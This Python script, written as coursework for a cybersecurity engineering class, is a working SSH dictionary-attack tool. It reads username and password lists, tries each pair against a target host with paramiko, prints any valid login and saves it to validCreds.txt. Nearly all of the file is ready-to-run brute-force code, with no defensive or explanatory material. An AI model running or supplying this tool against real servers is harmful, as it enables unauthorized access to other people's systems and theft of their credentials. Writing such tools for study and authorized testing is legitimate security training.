#!/usr/bin/env python3
##################################################
# SSH Brute Force
# Gabriel Conlon
# created: 09 September 2021
# in fulfillment of requirements for:
# SecureSet Cybersecurity Engineer Networks 400
##################################################

import paramiko
import socket
import argparse

# prompt user for port to check, default 22

def checkConnection (target, username, password, port):
    client = paramiko.SSHClient()
    # add known hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=target, username=username, password=password, port=port, timeout=2)
        client.open_sftp()
    except socket.timeout:
        print("Target unreachable")
        return False
    except paramiko.AuthenticationException:
        print(f"Invalid credentials for: {username}:{password}")
        return False
    except paramiko.SSHException:
        print("Uncaught SSH exception")
        return False
    # except EOFError:
    #     return False
    # except:
    #     print("Unknown exception")
    #     return False
    else:
        # connection established
        print(f"""Valid Credentials: HOSTNAME: {target}
              USERNAME: {username}
              PASSWORD: {password}
              PORT: {port}
              """)
        # command = "id"
        # print(f"User privileges: {client.exec_command(command)}")
        client.close()
        return True

if __name__ =="__main__":
    parser = argparse.ArgumentParser(description="SSH Dictionary Attack")
    parser.add_argument("target", help="Target machine")
    parser.add_argument("-p", "--port", help="Port")
    parser.add_argument("-P", "--passwords", help="Password file")
    parser.add_argument("-u", "--username", help="SSH Username")

    #parse args
    args = parser.parse_args()
    target = args.target
    passwords = args.passwords
    users = args.username
    port = args.port

    # read files
    users = open(users).read().splitlines()
    passwords = open(passwords).read().splitlines()

    # attack
    for u in users:
        for p in passwords:
            if checkConnection(target, u, p, port):
                # save if valid
                open("validCreds.txt", "w").write(f"""
                Username: {u}@{target}
                Password: {p}
                """)
                break